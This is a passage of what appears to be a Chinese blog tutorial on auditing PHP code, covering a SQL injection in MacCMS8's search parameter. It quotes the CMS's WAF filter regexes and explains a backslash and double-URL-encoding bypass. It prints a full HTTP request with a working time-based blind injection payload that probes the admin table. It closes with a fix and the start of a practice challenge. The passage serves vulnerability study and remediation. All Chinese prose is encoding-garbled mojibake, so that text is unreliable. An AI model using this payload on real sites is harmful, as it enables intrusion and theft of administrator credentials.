class="string">&quot;&lt;br&gt;æäº¤æ–¹å¼: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>].<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">arr_foreach</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltValue</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltKey</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ä»£ç çš„ <strong>ç¬¬13è¡Œ-ç¬¬19è¡Œ</strong> è°ƒç”¨æ­£åˆ™è¿›è¡Œå¤„ç†ï¼Œè€Œç›¸å…³çš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯ <strong>$ArrFiltReq</strong> å˜é‡ã€‚è¿™é‡Œ <strong>ç¬¬13è¡Œ</strong> çš„ <strong>$ArrFiltReq</strong> å˜é‡å°±æ˜¯å‰é¢ä¼ å…¥çš„ <strong>$getfilter</strong> ï¼Œå³è¯­å¥å˜æˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$getfilter</span>.<span class="string">&quot;/is&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ <strong>$getfilter</strong> å˜é‡ã€‚è¯¥å˜é‡åœ¨ <strong>inc\common\360_safe3.php</strong> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getæ‹¦æˆªè§„åˆ™</span></span><br><span class="line"><span class="variable">$getfilter</span> = <span class="string">&quot;\\&lt;.+javascript:window\\[\\].*\\&gt;|&lt;.*(&amp;#\\d+;)+?&gt;|&lt;.*(data|src)=data:text\\/html.*?&gt;|\\b(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark|[a-z]&#123;4,&#125;)\\b|\\bon\\w+=[^&gt;]+\\&gt;|SELECT\\s+(.*.)+\\b\\@&#123;1,2&#125;\\s+.*|SET\\s+.*\\b;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//postæ‹¦æˆªè§„åˆ™</span></span><br><span class="line"><span class="variable">$postfilter</span> = <span class="string">&quot;&lt;.*=&amp;(#\\d+;)?&gt;.*(alert\\|confirm\\|expression\\|prompt\\|benchmark.*?|sleep.*?|group_concat\\).*?\\b(load_file|benchmark)\\b|\\bon\\w+=[^&gt;]+\\&gt;|\\bEXEC\\b|UNION\\s+SELECT.*|INSERT\\s+INTO.*VALUES\\s*(\\(.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cookieæ‹¦æˆªè§„åˆ™</span></span><br><span class="line"><span class="variable">$cookiefilter</span> = <span class="string">&quot;benchmark.*?|\\b(load_file|exec|SELECT|INSERT|DELETE|CREATE|ALTER|DROP|TRUNCATE|\\@\\@)\\b.*?VALUES\\(.*|SET\\s+.*&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸²ä»£ç çš„åŠŸèƒ½æ˜¾è€Œæ˜“è§ï¼Œå°±æ˜¯æ£€æµ‹ <strong>GETï¼ŒPOSTï¼ŒCOOKIE</strong> ä¸­çš„æ¶æ„æ•°æ®ã€‚åˆšåˆšåœ¨ <strong>chkSql()</strong> å‡½æ•°æœ€åæœ‰ä¸²ä»£ç æ˜¯ï¼š <strong>return htmlEncode($s);</strong> ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ <strong>htmlEncode</strong> å‡½æ•°ã€‚è¯¥å‡½æ•°ä½ç½®åœ¨ <strong>inc\common\function.php</strong> æ–‡ä»¶ä¸­ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯é’ˆå¯¹ <strong>&amp;</strong> ã€ <strong>â€˜</strong> ã€ <strong>ç©ºæ ¼</strong> ã€ <strong>â€œ</strong> ã€ <strong>TAB</strong> ã€ <strong>å›è½¦</strong> ã€ <strong>æ¢è¡Œ</strong> ã€ <strong>å¤§äºå°äºå·</strong> ç­‰ç¬¦å·è¿›è¡Œå®ä½“ç¼–ç è½¬æ¢ã€‚ä½†æ˜¯è¿™é‡Œç™¾å¯†ä¸€ç–ï¼Œæ²¡æœ‰é’ˆå¯¹å…¶ä»–çš„ç©ºç™½å­—ç¬¦å’Œåæ–œæ è¿›è¡Œå¤„ç†ã€‚è¿™é‡Œå…ˆåŸ‹ä¸‹ä¸€ä¸ªä¼ç¬”ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ã€‚</p><p>é¦–å…ˆæ³¨å…¥ç‚¹æ˜¯åœ¨ <strong>inc\common\template.php</strong> ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»§ç»­çœ‹çœ‹è¿™ä¸ª <strong>$lp[â€˜wdâ€™]</strong> çš„å€¼æ˜¯æ€ä¹ˆè·å–çš„ï¼Œåœ¨ <strong>inc\common\template.php</strong> æ–‡ä»¶ä¸­æ‰¾åˆ°å…¶ç›¸å…³ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;vod&#x27;</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;order&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;order&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;by&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;by&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;pagesize&#x27;</span>]))&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>])) &#123; <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] = <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;wd&quot;</span>]; <span class="variable language_">$this</span>-&gt;P[<span class="string">&quot;auto&quot;</span>] = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>ä¸Šå›¾ <strong>ç¬¬13è¡Œ</strong> ï¼Œå½“ <strong>P[â€˜wdâ€™]</strong> ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œ <strong>$lp[â€˜wdâ€™]</strong> æ˜¯ä» <strong>P[â€œwdâ€]</strong> ä¸­è·å–åˆ°æ•°æ®çš„ã€‚æ ¹æ®å‰é¢æˆ‘ä»¬çš„åˆ†æï¼Œåœ¨ <strong>inc\module\vod.php</strong> æ–‡ä»¶ä¸­çš„å­˜åœ¨è¿™æ ·ä¸€è¡Œä»£ç ï¼š <strong>$tpl-&gt;P[â€œwdâ€] &#x3D; $wd;</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); </span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$wd</span>)) &#123;</span><br><span class="line">        <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ <strong>wd</strong> æ˜¯å¯ä»¥ä» <strong>REQUEST</strong> ä¸­è·å–åˆ°ï¼Œæ‰€ä»¥è¿™é‡Œçš„ <strong>wd</strong> å®é™…ä¸Šæ˜¯å¯æ§çš„ã€‚</p><h3 id="æ¼æ´éªŒè¯-1"><a href="#æ¼æ´éªŒè¯-1" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>ç°åœ¨æˆ‘ä»¬éœ€è¦é’ˆå¯¹æ¼æ´è¿›è¡ŒéªŒè¯å·¥ä½œï¼Œè¿™å°±æ¶‰åŠåˆ°POCçš„æ„é€ ã€‚åœ¨å‰é¢åˆ†æä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ <strong>htmlEncode</strong> é’ˆå¯¹ <strong>&amp;</strong> ã€ <strong>â€˜</strong> ã€ <strong>ç©ºæ ¼</strong> ã€ <strong>â€œ</strong> ã€ <strong>TAB</strong> ã€ <strong>å›è½¦</strong> ã€ <strong>æ¢è¡Œ</strong> ã€ <strong>å¤§äºå°äºå·</strong> è¿›è¡Œå®ä½“ç¼–ç è½¬æ¢ã€‚ä½†æ˜¯è¿™é‡Œçš„æ³¨å…¥ç±»å‹æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œéœ€è¦å¼•å…¥å•å¼•å·æ¥è¿›è¡Œé—­åˆï¼Œä½†æ˜¯ <strong>htmlEncode</strong> å‡½æ•°åˆå¯¹å•å¼•å·è¿›è¡Œäº†å¤„ç†ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°æ³¨å…¥æ”»å‡»çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ <strong>$lp[â€˜wdâ€™]</strong> å‚æ•°å¯ä»¥æ§åˆ¶SQLè¯­å¥ä¸­çš„ä¸¤ä¸ªä½ç½®ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥ <strong>åæ–œæ </strong> è¿›è¡Œå•å¼•å·çš„é—­åˆï¼Œä½†æ˜¯é’ˆå¯¹å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“å…¶è°ƒç”¨äº† <strong>addslashes</strong> å‡½æ•°è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œè€Œ <strong>addslashes</strong> ä¼šå¯¹ <strong>åæ–œæ </strong> è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯è¿™é‡Œå¯¹ç”¨æˆ·è¯·æ±‚çš„å‚æ•°åˆä¼šå…ˆè¿›è¡Œ <strong>urlè§£ç </strong> çš„æ“ä½œï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ä½¿ç”¨ <strong>åŒurlç¼–ç </strong> ç»•è¿‡ <strong>addslashes</strong> å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span> . <span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>] . <span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/maccms8/index.php?m=vod-search</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-mel">wd=))||<span class="keyword">if</span>((<span class="keyword">select</span>%0b(<span class="keyword">select</span>(m_name)<span class="string">``</span>from(mac_manager))regexp(<span class="number">0x5e61</span>)),(<span class="string">`sleep`</span>(<span class="number">3</span>)),<span class="number">0</span>)#%25%35%63</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-17.png"></p><p>payloadä¼ åˆ°ç¨‹åºé‡Œï¼Œç»è¿‡æ‹¼æ¥åçš„æ•°æ®åº“è¯­å¥å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-18.png"></p><h3 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><strong>æ ¸å¿ƒé—®é¢˜ç‚¹</strong></p><ol><li><p><strong>ç”¨æˆ·è¾“å…¥æœªç»å……åˆ†éªŒè¯ä¸è¿‡æ»¤</strong>ï¼š</p><ul><li>é—®é¢˜çš„æ ¸å¿ƒåœ¨äºç”¨æˆ·è¾“å…¥ï¼ˆé€šè¿‡<code>$lp[&#39;wd&#39;]</code>ï¼‰è¢«ç›´æ¥ç”¨äºSQLæŸ¥è¯¢æ„å»ºï¼Œè€Œæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥å’Œé™åˆ¶ã€‚</li><li>å°½ç®¡è¾“å…¥ç»è¿‡äº†<code>chkSql()</code>çš„åˆæ­¥å¤„ç†ï¼ŒåŒ…æ‹¬URLè§£ç å’Œ<code>StopAttack()</code>çš„å®‰å…¨è¿‡æ»¤ï¼Œä½†è¿™äº›æªæ–½æœªèƒ½å®Œå…¨é¿å…SQLæ³¨å…¥çš„é£é™©ã€‚</li></ul></li><li><p><strong>ä½¿ç”¨<code>addslashes()</code>çš„ä¸è¶³</strong>ï¼š</p><ul><li><code>be()</code>å‡½æ•°ä½¿ç”¨<code>addslashes()</code>æ¥è½¬ä¹‰è¾“å…¥æ•°æ®ã€‚ä½†<code>addslashes()</code>å¯¹äºå•å­—èŠ‚å­—ç¬¦é›†ç¯å¢ƒå¯èƒ½è¶³å¤Ÿï¼Œå¯¹äºå¤šå­—èŠ‚å­—ç¬¦é›†å¦‚UTF-8ï¼Œè¿™ç§è½¬ä¹‰æ–¹æ³•å¯èƒ½è¢«ç»•è¿‡ã€‚</li><li>åœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹ï¼ŒåŒé‡URLç¼–ç å¯ä»¥ç»•è¿‡<code>addslashes()</code>çš„è½¬ä¹‰ï¼Œå¯¼è‡´æ³¨å…¥æ”»å‡»çš„å¯èƒ½ã€‚</li></ul></li><li><p><strong>ä¸æ°å½“çš„SQLæŸ¥è¯¢æ„å»ºæ–¹å¼</strong>ï¼š</p><ul><li>SQLæŸ¥è¯¢é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ„å»ºï¼Œå…¶ä¸­ç›´æ¥æ’å…¥äº†ç”¨æˆ·æ§åˆ¶çš„å˜é‡<code>$lp[&#39;wd&#39;]</code>ã€‚è¿™ç§æ–¹å¼åœ¨æ²¡æœ‰ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œé€‚å½“çš„è½¬ä¹‰æœºåˆ¶çš„æƒ…å†µä¸‹ï¼Œææ˜“å¯¼è‡´SQLæ³¨å…¥ã€‚</li></ul></li><li><p><strong>å®‰å…¨å‡½æ•°<code>htmlEncode()</code>çš„ä¸è¶³</strong>ï¼š</p><ul><li>è¯¥å‡½æ•°ä¸»è¦å¯¹HTMLç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç ï¼Œä½†åœ¨é˜»æ­¢SQLæ³¨å…¥æ–¹é¢ä½œç”¨æœ‰é™ã€‚</li><li>SQLæ³¨å…¥éœ€è¦é’ˆå¯¹SQLè¯­æ³•ç‰¹å¾è¿›è¡Œä¸“é—¨çš„å¤„ç†ï¼Œè€Œéä»…ä»…æ˜¯HTMLç¼–ç ã€‚</li></ul></li></ol><p>è¿™é‡Œçš„é˜²å¾¡æ‰‹æ®µå…¶å®å·²ç»å¾ˆå¤šäº†ï¼Œä½†å°±æ˜¯å› ä¸ºè¿™ä¹ˆå¤šé˜²å¾¡æ‰‹æ®µç»“åˆåœ¨ä¸€èµ·å‡ºç°äº†æœ‰è¶£çš„ç»•è¿‡æ–¹å¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isN</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">38</span>), <span class="string">&quot;&amp;#38;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">39</span>), <span class="string">&quot;&amp;#39;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">32</span>), <span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">34</span>), <span class="string">&quot;&amp;quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">9</span>), <span class="string">&quot;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">13</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">92</span>), <span class="string">&quot;&lt;br /&gt;&quot;</span>,<span class="variable">$str</span>);      <span class="comment">//æ–°å¢ä¿®å¤ä»£ç </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ–œæ çš„asciiç æ˜¯92ï¼Œè¿™é‡Œæ–°å¢ä¸€è¡Œä»£ç å¤„ç†åæ–œæ ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-19.png"></p><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">          <span class="keyword">foreach</span> (<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">              <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">dhtmlspecialchars</span>(<span class="variable">$val</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$string</span> = <span class="title function_ 